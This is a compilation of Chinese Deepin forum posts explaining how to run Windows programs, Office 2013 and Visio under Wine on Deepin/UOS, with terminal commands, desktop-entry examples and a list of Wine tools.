之前开帖介绍过用原生wine运行便携式exe程序（绿色程序）的方法，有朋友想知道bat程序如何运行，现在再开一帖介绍一下方法。学习本帖内容前建议先看前四帖内容。用原生wine运行绿化版exe程序（bat程序）的方法其实跟[wine使用教程4-用原生wine运行便携式exe程序（绿色软件）的方法](/zh/常见问题FAQ/Wine/用原生wine运行便携式exe程序绿色软件的方法)是差不多的，只不过把wine命令换成wineconsole而已。本帖案例软件名称假定为AppDemo.exe，bat文件名称假定为绿化处理.bat，容器名称假定为Deepin-AppDemo。方法如下：1、下载绿化版exe程序包并解压。案例软件：AppDemo.exe。

2、创建一个全新容器。创建容器的终端命令：```bash WINEARCH=win32或者wine64 WINEPREFIX=容器路径 wine winecfg ```案例：```bash WINEARCH=win32 WINEPREFIX=~/.deepinwine/Deepin-AppDemo wine winecfg ```上述命令结构解析：1. `WINEARCH=`后面写win32，即表示新建一个32位的容器，如果写win64，即表示新建一个64位的容器。2. `WINEPREFIX=`是指定的容器路径（此处Deepin-AppDemo就是准备新建的容器名称）。3. `wine`即你指定的wine的执行程序，原生wine的执行程序就是wine。（注：创建容器时如果提示安装mono，可点取消。mono模拟的.NET Framework，不是所有exe软件都需要这个。需要的时候你再手动安装即可）Windows版本要跟根据你所运行的exe软件要求选择。特别说明：1. 楼主已经把自己电脑里的原生wine升级到了最新版，即wine开发版7.11。2. Deepin系统预装的原生wine版本是4.0，过于老旧，很多exe程序wine4.0都不能运行。因此建议小伙伴升级原生wine到最新版本。3. **升级原生wine的方法见WineHQ官网：** https://wiki.winehq.org/Debian_zhcn。

3、拷贝exe软件目录至容器c盘中。

4、运行绿化程序bat文件。运行bat文件的终端命令：```bash WINEPREFIX=容器路径 wineconsole "bat文件在容器c盘中的路径" ```案例：```bash WINEPREFIX=~/.deepinwine/Deepin-AppDemo wineconsole "c:/Program Files/AppDemo/绿化处理.bat" ```提醒：bat文件名不要带感叹号和其他符号，中文名或英文名即可。

5、测试运行exe主程序。终端命令：```bash WINEPREFIX=容器路径 wine "exe程序在容器C盘中的路径" ```案例：```bash WINEPREFIX=~/.deepinwine/Deepin-AppDemo wine "c:/Program Files/Appdemo/AppDemo.exe" ```

6、安装字体。之前教程介绍过，解决字体问题有三种方法，我个人建议小白直接安装星火应用商店里的“Win字体”即可。

7、创建桌面图标。在桌面新建一个txt文件（如screentogif.txt），复制以下内容到txt文件里：```ini [Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Deepin-AppDemo wine "c:/Program Files/AppDemo/AppDemo.exe"' Icon=/usr/share/icons/Default/devices/64/media-optical.svg MimeType= Name=AppDemo StartupNotify=true Type=Application X-Deepin-Vendor=user-custom ```注：Exec= ————sh -c 'WINEPREFIX=容器路径 wine "exe主程序路径在虚拟C盘里的路径"' 特别提醒:这里/home/$USER/不能写成~/。Icon= ————指图标路径，文件格式一般为png、svg、icon，图标大小64×64为宜，图标格式最好是svg。Name= ————图标文件显示的名称。以上三项后面的内容可以根据你自己所安装的软件的实际情况更改。上面的内容填写好后保存退出txt，右键重命名，把这个txt文件的后缀改为desktop（如appdemo.desktop）。这样就可以双击桌面图标运行该软件了。

8、其他配置。以上步骤为基础步骤。但除以上步骤外，有的exe软件还需要替换dll函数库，会用到winecfg、winetricks，有的软件需要安装mono或Gecko，有的软件还需要安装dxvk。这些都是比较高级的玩法，楼主能力有限，无法为大家讲解。

标题：6-用deepin-wine6-stable安装Office2013
注：建立deepin-wine6-stable环境：新装的系统需要安装一款应用商店里使用deepin-wine6-stable运行的wine应用（如wine版微信、wine版QQ），并运行一下。（系统会自动建立deepin-wine6-stable环境）

一、下载Microsoft Office 2013安装镜像并解压 以下教学所用Microsoft Office 2013安装镜像（cn_office_professional_plus_2013_x86_x64_dvd_1149708.iso）从[MSDN网站下载](https://msdn.itellyou.cn/)。 Microsoft Office2013安装镜像iso文件放在下载文件夹（~/Downloads） 右键解压

二、新建容器 新建一个32位的windows7容器（容器名为Deepin-Office） 终端命令： ```bash WINEARCH=win32 WINEPREFIX=~/.deepinwine/Deepin-Office deepin-wine6-stable winecfg ``` 上述命令结构解析： 1. `WINEARCH=`后面写win32，即表示新建一个32位的容器，如果写win64，即表示新建一个64位的容器。（目前wine对32位程序支持较好，若无特殊情况，建议新建32位容器） 2. `WINEPREFIX=`是指定的容器路径 3. `deepin-wine6-stable`是你使用的wine 4. `winecfg`是调出wine设置 注意：不同字段之间有一个空格（英文输入法），下同。 容器新建好后，就会在~/.deepinwine下多一个Deepin-Office的文件夹，这个文件夹就是模拟的windows系统环境，被称为wine容器

三、安装Microsoft Office 2013 终端命令： ```bash WINEPREFIX=~/.deepinwine/Deepin-Office deepin-wine6-stable ~/Downloads/cn_office_professional_plus_2013_x86_x64_dvd_1149708/setup.exe ``` 上述命令结构解析： 1. `WINEPREFIX=`是指定的容器路径 2. `deepin-wine6-stable`是你使用的wine 3. 最后接你要运行的exe程序的路径 弹出Office的安装引导界面后，按提示操作安装即可。

四、测试运行 终端命令： ```bash WINEPREFIX=~/.deepinwine/Deepin-Office deepin-wine6-stable "c:/Program Files/Microsoft Office/Office15/WINWORD.EXE" ``` 上述命令结构解析： 1. `WINEPREFIX=`是指定的容器路径 2. `deepin-wine6-stable`是你使用的wine 3. 最后接英文双引号，双引号内是你要运行的exe程序在容器drive_c（即模拟的c盘）中的路径，这里测试的Word

五、制作桌面图标 以Access的图标为例，Word、Excel、PowerPoint的图标制作方法一样，就不一一介绍了。 在桌面新建一个txt文件，命名为MSACCESS.txt，复制以下内容到txt文件里： ```ini [Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Deepin-Office deepin-wine6-stable "c:/Program Files/Microsoft Office/Office15/MSACCESS.EXE"' Icon=1F9D_MSACCESS.0 MimeType= Name=Access StartupNotify=true Type=Application X-Deepin-Vendor=user-custom ``` 保存退出txt，右键重命名，把这个txt文件的后缀改为desktop 注： Exec= ————sh -c 'WINEPREFIX=容器路径 deepin-wine6-stable "exe主程序路径在虚拟C盘里的路径"' Icon= ————指图标路径，如果图标在~/.local/share/icons/hicolor文件夹（及其子文件夹），就不用写完整路径，只需要写图标文件的文件名（不写文加后缀）。使用deepin-wine6-stable安装的exe程序，deepin-wine6-stable会将exe程序的图标文件放到~/.local/share/icons/hicolor的子文件夹里，是系统随机命名的。你只需要在hicolor文件夹搜索就可以找到了，然后把搜索出的文件名填到Icon=这一栏即可。（注意，上面的Icon=后面的文件名需要你自己改的） Name= ————图标文件显示的名称，这里填Access 特别说明，Exec=后面不能用`~`来代替`/home/$USER`

六、双击运行桌面图标测试一下 成功运行

七、字体问题 为了一劳永逸解决wine应用字体显示乱码、方块、显示不出等问题，建议你安装星火应用商店里的“Win字体”

标题：Deepin 23 Preview 运行自定义 exe
安装 Wine 运行器，如果安装了 linglong 格式包的 wine 程序，将可以直接在 WINE 版本处选择选项并使用。也可以在`程序`=>`安装Wine(只限Deepin 23)`，添加 Deepin 20 源并安装 Wine。

在使用 linglong 包的 Wine 应用时，必须安装至少一个 linglong 的使用 Wine 软件包才会出现该选项，而程序识别到的 Wine 是按 linglong 的使用 Wine 软件包名的字母排序第一个的 Wine，且生成的容器不在用户目录下，而是在容器的用户目录下（~/.deepinwine、/tmp、桌面、下载、文档等被映射的目录除外），同理需要运行的 EXE 也必须在被映射的目录内。

如果是使用 Deepin 23 的 Wine 安装脚本，请切记——安装过程会临时添加 Deepin 20 的 apt 源，不要中断安装以及千万不要中断后不删除源的情况下 apt upgrade ！！！中断后只需重新打开脚本输入 repair 或者随意安装一个 Wine（会自动执行恢复操作）即可。以及此脚本安装的 Wine 无法保证 100% 能使用，以及副作用是会提示 ```bash N: 鉴于仓库 'https://community-packages.deepin.com/beige beige InRelease' 不支持 'i386' 体系结构，跳过配置文件 'main/binary-i386/Packages' 的获取。 ```

随便安装一个 linglong 格式包的 wine 程序（要记住包名），然后在终端输入 ```bash ll-cli run 包名 --exec '/bin/deepin-wine6-stable' ``` 即可，缺陷可看运行器上方小提示第 6 点。

添加 Deepin 20 的**官方源和商店源**，然后输入如下的命令：**切记不能sudo apt upgrade**，会出现的问题可以看运行器的小提示第 7 点，以及无法保证所有 Wine 均可运行。```bash sudo dpkg --add-architecture i386 sudo apt update # 安装普通的 Wine sudo apt install wine # 安装 deepin-wine5-stable（本机测试 X64 的 Wine 跑不了） sudo apt install deepin-wine5-stable # 安装 deepin-wine6-stable sudo apt install deepin-wine6-stable ``` 使用完后最好删除掉 Deepin 20 的官方源和商店源，防止出问题。可以看 [@ThinkYoung](user/18570) 写的 https://bbs.deepin.org/post/241148 ，可以参考借鉴。

## Generated by deepin-installer deb https://community-packages.deepin.com/deepin/ apricot main contrib non-free

# Written by deepin-home-appstore-client deb https://com-store-packages.uniontech.com/appstore deepin appstore

安装 Wine 运行器，如果安装了 linglong 格式包的 wine 程序，将可以直接在 WINE 版本处选择选项并使用
也可以在`程序`=>`安装Wine(只限Deepin 23)`，添加 Deepin 20 源并安装 Wine

提示
1. 在使用 linglong 包的 Wine 应用时，必须安装至少一个 linglong 的使用 Wine 软件包才会出现该选项，而程序识别到的 Wine 是按 linglong 的使用 Wine 软件包名的字母排序第一个的 Wine，且生成的容器不在用户目录下，而是在容器的用户目录下（~/.deepinwine、/tmp、桌面、下载、文档等被映射的目录除外），同理需要运行的 EXE 也必须在被映射的目录内  
2. 如果是使用 Deepin 23 的 Wine 安装脚本，请切记——安装过程会临时添加 Deepin 20 的 apt 源，不要中断安装以及千万不要中断后不删除源的情况下 apt upgrade ！！！中断后只需重新打开脚本输入 repair 或者随意安装一个 Wine（会自动执行恢复操作）即可。

随便安装一个 linglong 格式包的 wine 程序（要记住包名），然后在终端输入

```bash
ll-cli run 包名 --exec '/bin/deepin-wine6-stable'
```

添加 Deepin 20 的官方源和商店源，然后输入如下的命令：切记不能sudo apt upgrade，会出现的问题可以看运行器的小提示第 7 点，以及无法保证所有 Wine 均可运行

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine
sudo apt install deepin-wine5-stable
sudo apt install deepin-wine6-stable
```

使用完后最好删除掉 Deepin 20 的官方源和商店源，防止出问题

20 官方源：
deb https://community-packages.deepin.com/deepin/ apricot main contrib non-free

20 商店源：
deb https://com-store-packages.uniontech.com/appstore deepin appstore

标题：Deepin-wine适配知识库&工具包（最新）
【腾讯文档】统信UOS：Deepin-Wine适配知识库 https://docs.qq.com/mind/DWFBpbmpjd0RtV2Z0
统信UOS：Deepin-Wine工具包下载链接 https://docs.deepin.com/f/a4b0acc862/?raw=1
这里整理汇编了关于Deepin-wine适配过程中所遇到的问题和解决办法，以及统信UOS个人版第一批wine应用上架应用列表，目前Deep-wine工具包还在由研发的同学进行调整，后续我们会第一时间提供工具包链接，并且持续更新知识库，如有问题可留言，欢迎大家提出建议。
感谢所有小伙伴们对统信UOS适配活动的参与和支持，以下是第一期众测适配活动参与的用户：JackLee_CN、邹永赫、江户川_柯北、张林峰、清越、冯世龙、谦言谦语、Geek-dreams、毛线、青山绿水、潮鸣、Then...、亲，别抽风、Arron Guo、金子食客、英特纳雄耐尔、狼毒花13997235254、Bryson、qxqzx、S-Dream、安稳也逍遥、林凌儿、黄西子、暮色、项升、左翼苦13、maicss@126.com、.(･ิϖ･ิ)っ-、@月、A张昊远ᵀᴱᴸ₈₀₂₃、CHONG.CHEN、Clay、DCTXX、Dont't Panic、H.H.、linux-prog、Marlon、Nam楠、shayneX、Ziggy、常淇昱、超热血的年青人、栋、琥珀、槐树镇8号、姜久奔、李若贤、林森、龙强、罗俊森、拟世、奇异天空、清风、人与自然 key→1%、若灮、施以勒、水源、汤.YongXiao、天、王文瑞、忘记、过去、未雨绸缪的妙磊、香当红烧烤、效果春、杨man_、一念为云 mantianlvye、张工、阵阵小语、蒸小肉包。
后续，我们马上会迎来第二期的统信UOS众测适配活动，还有丰富的奖品等着大家，欢迎小伙伴们扫码加入我们的生态互动群，发挥linux极客精神，在国产操作系统生态建设的道路刻上你的名字吧。
生态互动社群权益：加入UOS生态交流群，你将：1.参与国产操作系统生态共建，与linux技术同好者一起交流，共同学习成长；2.与官方技术支持人员在线交流，不定期邀请神秘大咖进行分享活动，干货多多；3.生态交流群囊括Deepwine众测、安卓模拟器测试和硬件适配等官方活动，奖励多多。
最后，我们再次衷心的感谢大家对活动的积极参与和支持，未来，我们会继续努力，打造完善优秀的统信UOS系统应用生态圈，统信UOS系统生态建设也因你们的存在变得更有意义！

标题：Wine 运行器小白使用方式
下面是送给小白的 wine 运行器简单使用方法，先声明，wine 并不能完美的运行所有 exe 文件，利用此 wine 运行器简易安装可执行文件的方法如下：1. 安装本程序2. 在应用商店里随便安装一个 QQ 或者微信等基于 deepin-wine6-stable 打包的应用   ![image.png](https://storage.deepin.org/thread/202207061542433333_image.png)3. 找到需要安装的 exe，双击或者右键=》打开方式=》wine 运行器打开   ![image.png](https://storage.deepin.org/thread/202207061543443740_image.png)4. 点击“运行程序”即可   ![image.png](https://storage.deepin.org/thread/202207191920282406_image.png)

标题：wine使用教程7-借用容器和wine版本安装MicrosoftOffice2013
之前给大家介绍过如何利用deepin-wine6-stable安装Microsoft Office 2013的方法（详见教程第6辑）。经测试，此方法安装的Microsoft Office 2013无法连接服务器，以致于无法输入激活密钥。就此，楼主换一种思路，借用星火商店战网客户端的容器和wine版本来安装Microsoft Office 2013。经测试，可以连接服务器了。说明：利用第6辑和第7辑方法安装的Microsoft Office 2013的PowerPoint和OneNote无法使用，暂未找到解决方法。

一、下载Microsoft Office2013安装镜像并解压。以下教学所用Microsoft Office2013安装镜像（cn_office_professional_plus_2013_x86_x64_dvd_1149708.iso）从MSDN网站下载。Microsoft Office2013安装镜像iso文件放在下载文件夹（~/Downloads）。右键解压。

二、安装星火应用商店战网客户端并首次运行。安装星火商店里的战网客户端，安装好后一定要双击战网的图标运行一次（直到出现战网客户端账号登录界面，就可以关闭客户端了）。首次运行将建立战网客户端的容器（Deepin-Battlenet文件夹）以及wine版本（Lwine7.1文件夹）。

三、复制容器和wine版本并改名。（1）复制Deepin-Battlenet容器并改名Spark-Office。（2）复制Lwine7.1并改名为Lwine7.1-my。

四、设置容器Spark-Office的windows版本。终端命令：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/winecfg。在弹出的wine设置窗口，将windows版本设置为windows7。

五、安装Gecko。终端命令：32位Gecko：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/wine msiexec /i ~/.deepinwine/Lwine7.1-my/gecko/wine-gecko-2.47.2-x86.msi。64位gecko：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/wine msiexec /i ~/.deepinwine/Lwine7.1-my/gecko/wine-gecko-2.47.2-x86_64.msi。

六、安装mono。终端命令：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/wine msiexec /i ~/.deepinwine/Lwine7.1-my/mono/wine-mono-7.1.1-x86.msi。

七、安装Microsoft Office 2013。终端命令：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/wine ~/Downloads/cn_office_professional_plus_2013_x86_x64_dvd_1149708/setup.exe。上述命令结构解析：（1）字段1：WINEPREFIX=是指定的容器路径。（2）字段2：~/.deepinwine/Lwine7.1-my/bin/wine是你所调用的wine的路径。（3）字段3：最后接你要运行的exe程序的路径。注意：不同字段之间有一个空格（英文输入法）。弹出Office的安装引导界面后，按提示操作安装即可。

八、测试运行。终端命令：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"。上述命令结构解析：（1）字段1：WINEPREFIX=是指定的容器路径。（2）字段2：~/.deepinwine/Lwine7.1-my/bin/wine是你所调用的wine的路径。（3）字段3：最后接英文双引号，双引号内是你要运行的exe程序在容器drive_c（即模拟的c盘）中的路径，这里测试的Word的路径。成功连接服务器，并提示激活Office。（某宝上5块一个激活码）。

九、制作桌面图标。以Access的图标为例，在桌面新建一个txt文件，命名为MSACCESS.txt，复制以下内容到txt文件里：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Spark-Office /home/$USER/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/MSACCESS.EXE"' Icon=MSACCESS MimeType= Name=Access StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。保存退出txt，右键重命名，把这个txt文件的后缀改为desktop，最终文件名为：MSACCESS.desktop。注：Exec= ————sh -c '字段1：用WINEPREFIX指定容器路径 字段2：wine的路径 "字段3：exe程序在虚拟C盘里的路径"' 注意这里有一个单引号和一个双引号（英文输入法）。Icon= ————指图标路径，如果图标在/usr/share/icons/hicolor/scalable/apps文件夹，就不用写完整路径，只需要写图标文件的文件名（不写文件后缀）。楼主把svg图标已经制作好了，你可以直接下载使用office图标.zip。下载解压，然后里面的6个svg图标复制到/usr/share/icons/hicolor/scalable/apps下。（注意，需要在apps文件夹里右键——以管理员身份打开）。Name= ————图标文件显示的名称，这里填Access。特别说明，Exec=后面不能用~来代替/home/$USER。

Word：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Spark-Office /home/$USER/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"' Icon=MSWORD MimeType= Name=Word StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。Excel：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Spark-Office /home/$USER/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/EXCEL.EXE"' Icon=MSEXCEL MimeType= Name=EXCEL StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。Outlook：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Spark-Office /home/$USER/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE"' Icon=MSOUTLOOK MimeType= Name=Outlook StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。POWERPNT：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Spark-Office /home/$USER/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"' Icon=MSPOWERPNT MimeType= Name=POWERPNT StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。OnoNote：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Spark-Office /home/$USER/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/ONENOTE.EXE"' Icon=MSONENOTE MimeType= Name=OneNote StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。

十、双击运行桌面图标测试一下。成功运行。十一、字体问题。为了一劳永逸解决wine应用字体显示乱码、方块、显示不出等问题，建议你安装星火应用商店里的“Win字体”。

十二、收尾工作——清理Spark-Office里战网客户端的文件夹。由于Spark-Office这个容器我们是复制的战网客户端的Deepin-Battlenet容器，里面有战网客户端的一些文件夹。为节省磁盘空间，我们可以把Spark-Office容器里与战网客户端有关的文件夹删掉。

补充：使用过程中，doc文件可以采用拖入Word中打开，或者在Word界面打开文件的方式打开，不要在doc文件右键选择Microsoft Word打开。如果在doc文件右键选择Microsoft Word打开，所调用的wine版本将不再是Lwine7.1-my/bin/wine，可能是调用的原生wine（也有可能是deepin-wine，究竟是哪一个我不太清楚），这会破坏Spark-Office容器环境。Excel、Access等同理。2022-7-3更新：PowerPoint、OneNote无法运行的问题已解决，详见以下两篇帖子：https://bbs.deepin.org/post/239888；https://bbs.deepin.org/post/239886。补充：经使用发现，用wine运行MS Office后，会有残留后台进程。所以建议大家在退出MS Office的程序后，去系统监视器强制关闭MS Office有关的进程。

标题：wine使用教程安装MicrosoftVisio2013
之前分享了关于在Deepin/UOS家庭版上安装Microsoft Office 2013的教程。有人说需要Visio，今天楼主开一帖介绍一下。楼主开帖重在介绍利用wine安装运行exe软件的方法，并不在于介绍个别软件。楼主在教程7里面把方法都介绍得十分清楚，学会举一反三，稍微变通一下，我相信每个人都会用同样的方法安装运行exe程序。本帖用的是教程7的容器和wine版本，学习本帖前，请先学习：[wine使用教程7-借用容器和wine版本安装Microsoft Office2013](https://bbs.deepin.org/post/239589)

一、下载Microsoft Visio 2013安装镜像并解压。Microsoft Visio 2013安装文件cn_visio_professional_2013_x86_1138439.exe放在下载文件夹（~/Downloads）

七、安装Microsoft Visio 2013。终端命令：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/wine ~/Downloads/cn_visio_professional_2013_x86_1138439.exe。上述命令结构解析：（1）字段1：WINEPREFIX=是指定的容器路径（2）字段2：~/.deepinwine/Lwine7.1-my/bin/wine是你所调用的wine的路径（3）字段3：最后接你要运行的exe程序的路径。注意：不同字段之间有一个空格（英文输入法）。弹出Visio的安装引导界面后，按提示操作安装即可。

八、测试运行。终端命令：WINEPREFIX=~/.deepinwine/Spark-Office ~/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/VISIO.EXE"。上述命令结构解析：（1）字段1：WINEPREFIX=是指定的容器路径（2）字段2：~/.deepinwine/Lwine7.1-my/bin/wine是你所调用的wine的路径（3）字段3：最后接英文双引号，双引号内是你要运行的exe程序在容器drive_c（即模拟的c盘）中的路径。

九、制作桌面图标。在桌面新建一个txt文件，命名为MSVISIO.txt，复制以下内容到txt文件里：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Spark-Office /home/$USER/.deepinwine/Lwine7.1-my/bin/wine "c:/Program Files (x86)/Microsoft Office/Office15/VISIO.EXE"' Icon=MSVISIO MimeType= Name=Visio StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。保存退出txt，右键重命名，把这个txt文件的后缀改为desktop，最终文件名为：MSVISIO.desktop。注：Exec= ————sh -c '字段1：用WINEPREFIX指定容器路径 字段2：wine的路径 "字段3：exe程序在虚拟C盘里的路径"' 注意这里有一个单引号和一个双引号（英文输入法）。Icon= ————指图标路径，如果图标在/usr/share/icons/hicolor/scalable/apps文件夹，就不用写完整路径，只需要写图标文件的文件名（不写文件后缀）。楼主把svg图标已经制作好了，你可以直接下载使用[MSVISIO.zip](https://storage.deepin.org/thread/202207051846463421_MSVISIO.zip)。下载解压，然后里面的svg图标复制到/usr/share/icons/hicolor/scalable/apps下。（注意，需要在apps文件夹里右键——以管理员身份打开）Name= ————图标文件显示的名称。特别说明，Exec=后面不能用~来代替/home/$USER。桌面图标如果显示不出来，可以注销系统再重新登录进入系统，图标就显示正常了。

另外，补充一下。如果安装了这个帖子[Microsoft Office 2013首次打包-限时体验](https://bbs.deepin.org/post/239932)的deb包的话，本帖第二至第六步、第十二步可以省略，但注意要将本帖第七至第九步里面的Lwine7.1-my替换为Lwine-7.1。

标题：wine工具盘点-linux上运行windows软件必备神器
官网：https://www.winehq.org/ 教程1：https://www.bilibili.com/video/BV1Kv411e7oM?share_source=copy_web 教程2：https://www.bilibili.com/video/BV1X5411H7BP?share_source=copy_web 建议：原版wine学学就好，平时用后面几款工具更好。

标题：deepin-wine
Deepin/UOS系统自带 教程1：https://www.bilibili.com/video/BV1Tu411i7UH/ 教程2：https://bbs.deepin.org/post/190801

标题：playonlinux
官网：https://www.playonlinux.com/en 下载链接：[官网版](https://www.playonlinux.com/script_files/PlayOnLinux/4.3.4/PlayOnLinux_4.3.4.deb) 教程1：https://bbs.deepin.org/post/189460 教程2：https://www.bilibili.com/video/BV1ii4y1876g?share_source=copy_web

标题：Lutris/wine游戏助手
官网（国际）：https://lutris.net/ 国内版网址：https://winegame.net/games Gitee项目地址：[gitee.com/winegame/lutris](https://gitee.com/winegame/lutris) 下载链接：[Deepin商店版（wine游戏助手）](https://d.store.deepinos.org.cn/store/games/net.winegame.client/net.winegame.client_0.5.9.3_amd64.deb) 简述：免费的 教程：https://hu60.cn/q.php/bbs.topic.94926.html

标题：Proton
ProtonDB社区网址：https://www.protondb.com/explore 教程：https://zhuanlan.zhihu.com/p/378551767?ivk_sa=1024320u

标题：crossover
官网（国际）：https://www.codeweavers.com/ 国内版网址：https://www.crossoverchina.com/ 下载链接：（1）[crossover-deepin专版（版本：17，免费）](https://d.store.deepinos.org.cn/store/others/crossover-deepin/crossover-deepin_17.1.0-1_i386.deb) （2）[中文收费版（版本：21）](https://cpv2.mairuan.com/crossoverchina.com/trial/Linux/crossover-21.2.0-1.deb) 教程：https://bbs.deepin.org/post/236789

标题：Vek
官网：https://jacklee02.gitee.io/vek/ Gitee项目地址:https://gitee.com/JackLee02/vekGame 下载链接：[星火应用商店版](https://d.store.deepinos.org.cn/store/games/org.sea-group.raa/org.sea-group.raa_1.0.2.5_amd64.deb) 教程：https://jacklee02.gitee.io/vek/

标题：Wine 运行器
官网：https://gitee.com/gfdgd-xi/deep-wine-runner Gitee项目地址:https://gitee.com/gfdgd-xi/deep-wine-runner 下载链接：https://gitee.com/gfdgd-xi/deep-wine-runner/releases 教程：https://gitee.com/gfdgd-xi/deep-wine-runner#%E5%AF%B9%E4%BA%8E-deepinuosamd64-%E5%B9%B3%E5%8F%B0%E5%B0%8F%E7%99%BD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%AF%A5%E7%A8%8B%E5%BA%8F

标题：wine运行器合并打包器和添加从镜像提取dll的功能
一个图形化了以下命令的程序：WINEPREFIX=容器路径 wine（wine的路径） 可执行文件路径

打包器可以方便的把您的 wine 容器打包成 deb 包供他人使用，程序创建的 deb 构建临时文件夹目录树包含DEBIAN、opt等目录，其中DEBIAN下有control文件，opt下有apps，apps下有XXX，XXX下有entries、files、info，entries下有applications和icons等。

该程序是使用 Python3 的 tkinter 构建的，测试平台包括deepin 20.6 1030；UOS 家庭版 21；Ubuntu 22.04

更新日志：1、添加并翻新了 deepin-wine5 打包器，改为 wine 打包器，支持常见 wine 的打包；2、新增 Visual Studio C++ 的安装程序；3、新增从系统安装镜像提取 DLL 到 wine 容器的功能（当前只支持 Windows XP 和 Windows Server 2003 的官方安装镜像）；4、修复了安装星火应用商店的 wine 运行器右键可执行文件打开方式没有 wine 运行器选项的问题；5、新增脚本，优化 deepin terminal 调用本程序脚本显示不佳的问题

运行器使用说明：1、使用终端运行该程序，可以看到 wine 以及程序本身的提示和报错;2、wine 32 位和 64 位的容器互不兼容;3、所有的 wine 和 winetricks 均需要自行安装（可以从 菜单栏=>程序 里面进行安装）;4、本程序支持带参数运行 wine 程序（之前版本也可以），只需要按以下格式即可：exe路径\' 参数 （单引号需要输入）;5、wine 容器如果没有指定，则会默认为 ~/.wine

打包器使用说明：1、deb 打包软件包名要求：软件包名只能含有小写字母(a-z)、数字(0-9)、加号(+)和减号(-)、以及点号(.)，软件包名最短长度两个字符；它必须以字母开头;2、如果要填写路径，有“浏览……”按钮的是要填本计算机对应文件的路径，否则就是填写安装到其他计算机使用的路径;3、输入 wine 的容器路径时最后面请不要输入“/”;4、输入可执行文件的运行路径时是以“C:/XXX/XXX.exe”的格式进行输入，默认是以 C： 为开头，不用“\”做命令的分隔，而是用“/”;5、.desktop 的图标只支持 PNG 格式和 SVG 格式，其他格式无法显示图标

下载链接：Gitee：https://gitee.com/gfdgd-xi/deep-wine-runner；Github：https://github.com/gfdgd-xi/deep-wine-runner；Gitlink：https://www.gitlink.org.cn/gfdgd_xi/deep-wine-runner；蓝奏云：https://gfdgdxi.lanzouj.com/b01nz7y3e，密码:7oii；星火应用商店：spk://store/tools/spark-deepin-wine-runner

标题：Wine运行器和Wine打包器傻瓜式使用教程（小白专用）
以深度Deepin和统信UOS为代表的基于Linux的国产自主操作系统的软件生态发展速度可谓是突飞猛进，但相较于已发展多年的微软Windows操作系统，国产自主操作系统的软件生态目前还存在很大的不足，那么，有没有一种方法可以实现在Linux系统下运行Windows系统下的软件呢？答案是肯定的，本文就介绍一款神器——Wine运行器（为保证成功率，建议在Deepin或UOS下安装使用）。

Wine运行器是一个能让Linux用户更加方便地运行Windows应用的程序，内置了对Wine图形化的支持、各种Wine工具、自制的Wine程序打包器和运行库安装工具等。此外，它还简化了如下命令，让你可以更简便地使用Wine：envWINEPREFIX=容器路径wine(wine的路径)可执行文件路径。

下面我们就来看一下如何使用Wine运行器（用它可直接在Linux系统下运行Windows系统下的软件）和其中内嵌的Wine打包器（用它可将已成功运行的Windows系统下的软件转化为脱离Wine运行器也可直接双击安装并运行的扩展名为.deb的Linux系统下的软件）。

1、准备windows软件安装包：为方便查找，最好把软件安装包放到UOS或Deepin系统（以下操作均在该系统下进行）的桌面或某个数据盘（分区）的一级目录下。windows软件安装包名称末尾的扩展名一般是.exe，是一个单独的可执行文件，但有的大型软件（如：Adobe系列软件）的安装包可能是一个压缩包，解压后一步步进入子文件夹，找到其中的安装文件Setup.exe。如果无法确认哪个是安装文件，可以在windows系统下测试一下，双击哪个文件可以启动该软件的安装进程，该文件就是安装文件。

2、启动Wine运行器：用鼠标右键点击上述安装文件Setup.exe——点击“打开方式”——点击“Wine运行器”——弹出“Wine运行器”主界面。注意：操作这一步的前提是你已经通过UOS或Deepin应用商店安装了“Wine运行器”这个软件的2.5.0版本噢。

